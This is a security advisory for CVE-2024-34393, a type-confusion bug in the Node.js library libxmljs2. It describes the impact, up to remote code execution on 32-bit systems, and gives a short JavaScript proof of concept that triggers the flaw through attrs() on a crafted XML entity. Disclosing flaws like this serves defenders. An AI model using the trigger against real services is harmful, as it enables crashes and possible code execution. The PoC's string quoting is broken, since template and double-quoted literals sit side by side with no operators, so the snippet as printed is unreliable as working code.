---
description: CVE-2024-34393, HIGH, libxmljs2 attrs type confusion RCE
title: libxmljs2 attrs type confusion RCE
date_published: "2024-05-02"
last_updated: "2024-05-02"
xray_id: JFSA-2024-001034097
vul_id: CVE-2024-34393
cvss: 8.1
severity: high
discovered_by: Uriya Yavnieli
type: vulnerability

---

## Summary

libxmljs2 attrs type confusion RCE

## Component

libxmljs2

## Affected versions

(,)

## Description

libxmljs2 is vulnerable to a type confusion vulnerability when parsing a specially crafted XML while invoking a function on the result of attrs() that was called on a parsed node. This vulnerability might lead to denial of service (on both 32-bit systems and 64-bit systems), data leak, infinite loop and remote code execution (on 32-bit systems with the XML_PARSE_HUGE flag enabled).

## PoC

```js
const libxmljs2 = require('libxmljs2');

var d = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note
[
<!ENTITY writer `" + 'A'.repeat(0x1234) + `">
]>
<from>&writer;</from>
`;

t = libxmljs2.parseXml(d, {flags: [libxmljs2.XMLParseFlags.XML_PARSE_HUGE]})
from = t.get('//from')
c = from.childNodes()[0]
c2 = c.childNodes()[0]
c2_attrs = c2.attrs()
```



## Vulnerability Mitigations

No mitigations are supplied for this issue



## References

[Original Advisory](https://github.com/marudor/libxmljs2/issues/204)

